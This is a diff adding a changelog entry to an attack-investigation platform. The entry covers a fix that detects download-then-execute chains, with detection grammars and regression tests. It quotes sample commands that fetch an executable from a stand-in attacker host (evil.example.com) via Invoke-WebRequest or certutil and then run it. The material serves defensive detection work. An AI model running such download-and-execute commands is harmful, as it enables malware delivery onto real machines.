@@ -1,5 +1,88 @@
 # NivXRay — Enterprise Attack Investigation Platform
 
+## 2026-08-01 · v1.3.3 · Generic Download → Write → Execute chain
+
+### Analyst false-negative reports driving this fix
+Two adjacent SME reports flagged the same missing capability:
+
+1. `Invoke-WebRequest http://evil.example.com/a.exe -OutFile a.exe;
+   Start-Process a.exe` → verdict was only `Suspicious · 55` and
+   the `-OutFile` destination was NOT surfaced as a File IOC.
+2. `certutil.exe -urlcache -split -f http://…/a.exe C:\…\a.exe
+   && start C:\…\a.exe` → verdict was `Runtime Dependent · 55` even
+   though the download-and-execute chain is deterministic. Behaviour
+   said "abuses certutil as a LOLBIN downloader" — a command-shape
+   label, not an analyst-oriented behaviour narrative.
+
+### Fix — behaviour-driven, command-agnostic
+- **New shared module** `intent/rules/_chain.py`
+  - `find_download_destinations(text)` recognises every deterministic
+    downloader → destination grammar: `-OutFile / -Destination /
+    -FilePath / -LiteralPath`, `.DownloadFile(url, dst)`, `certutil
+    -urlcache … URL DST`, `bitsadmin /transfer … URL DST`, `curl …
+    -o DST`, `wget … -O DST`.
+  - `is_invoked(text, needle)` recognises every deterministic
+    executor form: bare invocation after a shell separator, `start`
+    cmd builtin, `cmd /c`, PowerShell call operator `&`,
+    `Start-Process` / `Invoke-Item`.
+- **`remote_execution` intent** now fires when *any* download
+  destination is *invoked* later in the payload — regardless of the
+  specific downloader / interpreter. Same MITRE `T1204.002`, same
+  HIGH risk band, no LOLBin-specific rule required.
+- **Analyst report** consumes the shared destination finder so IOC
+  extraction and intent detection cannot drift out of sync.
+- **File IOCs** now include every download destination (both the
+  full path and the bare basename) whether it is quoted or not, and
+  the host of every URL is surfaced as a separate `domain` IOC.
+- **Analyst-friendly behaviours** — when the chain fires, the report
+  prepends three narrative rows:
+  `Downloads executable from remote URL` · `Writes executable to
+  disk as <name>` · `Executes downloaded executable`.
+- **Honesty unknown** — the report explicitly states
+  *"Downloaded executable was not analyzed. The verdict is based on
+  the observed Download → Write → Execute chain; the actual behaviour
+  of the downloaded payload can only be determined by fetching and
+  analysing it separately."*
+- **Zero unsupported family / campaign labels** — the report never
+  cites a specific malware family without evidence, enforced by
+  regression tests.
+
+### Trust Corpus grew to 14 samples
+- **T13 · iwr_outfile_startprocess** — Malicious · high band ·
+  URL + domain + `a.exe` file IOCs · MITRE `T1105 + T1204.002` ·
+  behaviours `downloads / writes / executes downloaded` ·
+  evidence tags `invoke-webrequest`, `chain:parameter`.
+- **T14 · certutil_start_chain** — Malicious · high band · same
+  IOC / MITRE / behaviour set with LOLBin downloader + cmd
+  `start` executor · evidence tags `certutil`, `chain:certutil`.
+- 14/14 samples pass · **100 % Accuracy · Honesty · Explainability
+  · Unknown Handling · Investigation Integrity** · 0 hard failures.
+
+### Regression coverage
+- New `tests/test_behavior_chain.py` — 40 parameterised tests
+  covering 6 downloader × executor combinations:
+  Invoke-WebRequest + Start-Process, certutil + `start`, curl +
+  bare invocation, wget + `&` call operator, Start-BitsTransfer +
+  Invoke-Item, WebClient.DownloadFile + Start-Process. Each combo
+  is asserted for verdict, file IOC, domain IOC, analyst-friendly
+  behaviours, honesty unknown, and no unsupported family label.
+- Locked negative tests: a download-only sample stays `SUSPICIOUS`
+  (no over-claim) and a `certutil` download without a follow-up
+  invocation must NOT fire `remote_execution`.
+- All 308/308 core investigation tests green.
+
+### Engineering principle (locked)
+> The Verdict Engine scores **normalised behaviour chains**, not
+> individual commands. Different download mechanisms and different
+> executor forms converge to the same semantic intent
+> (`Remote Payload Execution`) and produce consistent verdicts.
+> No LOLBin-specific rule is ever necessary.
+
+---
+
+
+# NivXRay — Enterprise Attack Investigation Platform
+
 ## 2026-07-29 · v1.3.2 · Atomic-IOC honesty guard
 
 ### SME false-positive report driving this fix
